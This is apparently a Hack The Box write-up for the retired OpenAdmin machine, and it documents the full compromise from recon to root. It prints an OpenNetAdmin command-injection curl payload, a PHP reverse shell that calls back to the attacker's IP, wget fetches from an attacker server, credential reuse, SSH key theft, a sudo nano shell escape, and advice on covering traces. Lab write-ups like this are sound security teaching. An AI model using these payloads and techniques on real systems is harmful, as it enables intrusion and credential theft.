# OpenAdmin
Details:
- OpenAdmin IP: 10.10.10.171
- Kali IP: 10.10.14.111
- Date of writeup: 3 May 2020
- **NOTE**: while writing, the box was retired, thus there are few screenshots.


Sections:
- [Recon](#recon)
- [Reverse shell](#reverse-shell)
- [Poking around](#poking-around)
- [Lateral movement](#lateral-movement)
- [Privesc to root](#privesc-to-root)
- [Going back to getting ssh access](#going-back-to-getting-ssh-access)
- [Learnings from ippsec walkthrough](#learnings-from-ippsec-walkthrough)

## Recon
First things first: run nmap
```
kali$  nmap -sC -sV 10.10.10.171
```
![](images/OpenAdmin_1.png?raw=true)

There's not much I can do with these results. Browsing to port 80 just shows the Apache Welcome page. So I run ```dirbuster``` to see where I should head to.
![](images/OpenAdmin_2.png?raw=true)

This quickly finds a lot of things. Most of them under ```/ona/```. When looking at this URL in the browser, we find out it seems an outdated software:

![](images/OpenAdmin_3.png?raw=true)

```searchsploit openNetAdmin``` confirms the suspicions. There’s an RCE vulnerability in version 18.1.1. It seems it can be run via metasploit. However, the scripts are simple enough to run them by hand. 

![](images/OpenAdmin_4.png?raw=true)

You just need to copy the curl command and change ```${cmd}``` with the command you want. Sounds easy, right?

## Reverse shell

Well, it took me longer than expected to achieve a reverse shell. Everything made it seem like I was missing some url encoding of certain characters. I attempted that with Burp.

I started Burp up and changed the browser’s proxy settings to point towards Burp interceptor.

![](images/OpenAdmin_5.png?raw=true)

I opened ```10.10.10.171/ona/``` in my browser. This was captured by Burp. Right click and send to repeater.

In the repeater, I modified the request to be a POST instead of a GET and to send the appropriate data, but somehow it kept failing to retrieve what I was expecting. I then attempted directly with curl, running the following: 
```
curl -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";whoami;echo \"END\"&xajaxargs[]=ping" http://10.10.10.171/ona/
```

We get a result where we can read ```www-data```, as expected (see the ```whoami``` command embedded in the curl request). But, once again, how to achieve a reverse shell?

I started to poke around with the curl request above, trying to get a sense of what could be done. What I found out was that the files that were supposed to be at the root of the ```/ona/``` URL (```login.php```, ```index.php```, ```logout.php```, etc., from the output of dirbuster) where all placed in the same folder where the commands were executed. So, if I can upload a php file and browse to it, the server will serve it and execute it.

I wrote a php file with the command to achieve a reverse shell (from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)) and attempted to upload it by changing ```whoami``` in the curl request by ```wget``` (note that the backward slash is needed since we’re inside the ```-d``` curl argument):
```
kali$  python3 -m http.server 8080
curl-command >  wget \”http://10.10.14.111:8081/script.php\”
curl-command > ls -la
```
![](images/OpenAdmin_6.png?raw=true)

**NOTE**: I didn’t succeed at first, so I attempted to upload the script several times. The scripts do not get renamed (see ```script.php``` and ```script.php.1```). Take that into account.

The script ended up being just this:
```php
<?php
$sock=fsockopen(“10.10.14.111”,4444);
exec(“/bin/sh -i <&4 >&4 2>&4”);
?>
```

So, now that I was able to upload the ```script.php``` file, I just started listening with ```nc -lvnp 4444``` and browsed to ```http://10.10.10.171/ona/script.php```.

Get a proper shell by running 
```
www-data$  python3 -c ‘import pty; pty.spawn(“/bin/bash”)’
Press CTRL-Z
kali$  stty raw -echo
kali$  fg
Press enter once more
```

## Poking around

Ok, now we're **www-data** in the server. In ```/etc/passwd``` there are two users: ```jimmy``` and ```joanna```.

Looking around at the web server's main folder, ```/var/www```, we see there's a folder, ```opt/ona```, which has some interesting files. Namely, ```/var/www/opt/ona/www/local/config/database_settings.inc.php```. This is a file for accessing mysql databases. In there, there's a clear text passwd: **n1nj4W4rri0R!** for the user: **ona_sys**.

Here, we've got a somewhat real life scenario. Some people don't usually have much interest in remembering a lot of passwords. Thus, they use the same for many services. I attempted the mentioned password for the previously found users and it turned out this gave me access to jimmy via ssh.
```
ssh jimmy@10.10.10.171
```

## Lateral movement

```jimmy``` turned out to not be the user I was hoping for. So it must be ```joanna``` who has the flag. Obviously, joanna's files were not accessible. So we have to find a way of moving laterally.

The first thing that I attempted was to get information from the ```mysql``` database. The configurations for it are in the ```/etc/mysql``` folder. In the configuration file we find that the port for the DB is 3306. Using the credentials found for the mysql DB, I logged in and performed a dump of the DB (with ```mysql -u ona_sys -p```), but I found nothing interesting.

I then ran [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS):
```
kali$  python3 -m http.server 8080
jimmy$  wget “http://10.10.14.111:8080/linpeas.sh
jimmy$  chmod +x linpeas.sh
jimmy$  ./linpeas.sh -a > linpeasReport.txt
```

The linpeas report showed that there were some user writable files in ```/var/www/internal/```. These were ```main.php```, ```logout.php``` and ```index.php```. ```index.php``` turned out to be a login page which had hardcoded credentials
```
username==jimmy
password== {sha512 hash}
```

Since they are writable, we don't even need to crack the hash. We can just change it for a hash of our own of which we do know the clear text. This is, however, of no use to us so far.

```index.php```, on successful authentication, redirected to ```main.php```. In that php file, there was an interesting command:
```php
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>"
```

So it seems that there should be a way of executing commands as joanna. Running ```ss -antup``` will show if there are some local ports which aren't accessible from the outside world, hoping that one of them is running this internal server:
```
Local Address           Foreign Address         State           PID/Program Name
127.0.0.1:6010          0.0.0.0:*               LISTEN          -
127.0.0.1:3306          0.0.0.0:*               LISTEN          -
127.0.0.1:52846         0.0.0.0:*               LISTEN          -
```

Port 3306 is the mysql database. Port 6010 is an X11 interface (by doing ```nc 0 6010``` from jimmy's console you can find that out). Port 52846 seemed to be a webserver (also, by doing ```nc 0 52846```)

I then went to the apache configuration files, and found out there was a ```/etc/apache2/sites-available/internal.conf``` conf file. This file defined a virtual host in 52846, and had the following configuration parameter:
```
AssignUserID joanna joanna
```

Cool, so if we can log in to that port, with index.php credentials, then we will be joanna and we can run whatever command we put in main.php.

First, log in as jimmy doing port forwarding (ssh tunneling):
```
ssh -L 4444:127.0.0.1:52846 jimmy@10.10.10.171
```

Modify ```index.php``` and ```main.php``` to use the password we want and run the command we want. **IMPORTANT**: after successfully moving laterally, remember to rollback the changes. This is directly applicable to real life scenarios as well (do not leave traces). In this case, it seemed the box had a cron job to check on changes in this folder and rebooted if it found any.

Then, in a browser, access ```localhost:4444```. Input credentials and observe output.

In my case, instead of leaking joanna's ssh key pair and going through the lengthy process of cracking the ssh passphrase for the encrypted private key, I just added a command to obtain a reverse shell.

## Privesc to root

It's much easier to achieve root than to get to the user in this box.

After running linpeas/linenum as joanna, it jumps straight out that a sudoers.d file is readable by joanna:
```
joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv
```

Great, nano is listed in [GTFOBins](https://gtfobins.github.io/):
```
CTRL-R CTRL-X
reset; sh 1>&0 2>&0
```

This will spawn a shell from nano.

Easy, right? Well, it seemed so at first, but sudo was not working. There was a weird ```PERM_ROOT``` error, which I later found out it was due to sudo not being correctly loaded. This process appears to happen at login, and we haven't actually logged in as joanna. So it appears we do need the ssh key pair.

## Going back to getting ssh access

The password was quite difficult to find. I do not have much processing power to crack passwords somewhat quickly, so I had a little help to speed up the process in Reddit. I knew, the passphrase started with ```bl```. So that reduced considerably the search space. It was **bloodninjas**.

```
ssh -i joanna_rsa joanna@10.10.10.171
sudo nano /opt/priv
```     

Then run the GTFOBins command for nano (see above) and that's it.

**There’s root!**

## Learnings from [ippsec walkthrough](https://www.youtube.com/watch?v=fdD-JTlkd3k)

Great walktrhough, as always.

- He explains how to bypass the URL encoding problem in [Reverse shell](#reverse-shell) section
- He explains linPEAS results of SUID and SGID
- He explains how to test users list against password lists with ```medusa``` for ssh and with ```sucrack``` for bash in the box.
- He explains a failure in the box that made it so you could get joanna's ssh keys without actually modifying the index.php file. He also explains how he would take advantage of a php error (using == instead of ===)
- He explains how would he get a reverse shell for root using crontab
